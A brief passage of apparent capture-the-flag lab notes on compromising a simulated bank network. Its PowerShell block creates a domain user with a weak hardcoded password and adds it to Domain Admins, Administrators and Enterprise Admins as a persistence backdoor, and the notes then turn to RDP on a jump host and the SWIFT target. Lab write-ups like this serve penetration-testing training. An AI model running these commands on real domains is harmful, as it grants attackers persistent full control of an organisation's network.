<- CORPDC

# New BANKDC Domain

```powershell
New-ADUser -SamAccountName "baturu" -UserPrincipalName "baturu@bank.thereserve.loc" -Name "Baturu" -GivenName "Baturu" -Surname "Lastname" -AccountPassword (ConvertTo-SecureString -AsPlainText "Password1@" -Force) -Enabled $true

# Add the user to Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members "baturu"

# Add the user to Administrators group
Add-ADGroupMember -Identity "Administrators" -Members "baturu"

# Add the user to Enterprise Admins group (optional)
Add-ADGroupMember -Identity "Enterprise Admins" -Members "baturu"
```

![[Pasted image 20230605114909.png]]

# RDP to JMP
![[Pasted image 20230605115112.png]]

WORK1 or 2 are the exactly the same.

Now the final thing left is the SWIFT. -> SWIFT